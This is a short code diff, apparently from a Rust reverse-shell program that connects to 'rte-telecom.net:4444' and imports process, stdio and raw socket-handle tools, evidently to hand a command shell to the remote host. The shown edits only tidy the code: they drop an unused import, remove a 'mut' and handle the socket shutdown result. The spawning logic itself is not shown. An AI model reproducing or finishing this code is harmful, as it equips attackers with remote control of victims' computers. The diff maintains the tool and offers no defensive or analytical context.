@@ -3,14 +3,14 @@ use std::net::{Shutdown, TcpStream};
 #[cfg(all(target_os="windows"))]
 use std::os::windows::io::{RawHandle, FromRawHandle, AsRawSocket};
 #[cfg(not(target_os="windows"))]
-use std::os::unix::io::{AsRawFd, FromRawFd, RawFd};
+use std::os::unix::io::{AsRawFd, FromRawFd};
 use std::process::{Command, Stdio};
 use std::thread::sleep;
 use std::time::Duration;
 
 fn main() {
     /* connect to host and port */
-    let mut stream = TcpStream::connect("rte-telecom.net:4444")
+    let stream = TcpStream::connect("rte-telecom.net:4444")
         .expect("connection failed");
 
     /* detect operating system
@@ -57,5 +57,5 @@ fn main() {
     }
 
     /* close socket */
-    stream.shutdown(Shutdown::Both);
+    stream.shutdown(Shutdown::Both).ok();
 }
